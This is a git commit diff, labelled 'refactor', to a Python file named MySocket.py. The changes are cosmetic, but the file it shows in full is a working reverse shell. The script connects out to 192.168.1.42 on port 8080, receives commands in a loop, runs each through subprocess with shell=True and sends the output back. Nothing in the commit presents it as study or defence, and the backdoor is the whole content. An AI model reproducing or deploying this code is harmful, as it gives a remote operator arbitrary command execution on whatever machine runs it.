32c7ea18888b41e4904502ff1bac6877702ddb08
umitdogan <umit9551@gmail.com>
2022-08-12 21:36:45 +0300

    refactor

--- MySocket.py
+++ MySocket.py
@@ -1,14 +1,16 @@
 import socket
 import subprocess
 import optparse as op
+
 def command_execution(command):
     return subprocess.check_output(command, shell=True)
 
 my_connection  = socket.socket(socket.AF_INET, socket.SOCK_STREAM);
-my_connection.connect(('192.168.1.42', 8080))
+my_connection.connect(('192.168.1.42', 8080));
+
 while True:
     command = my_connection.recv(1024);
     command_output = command_execution(command)
+
     my_connection.send(command_output);   
-    
 my_connection.close();
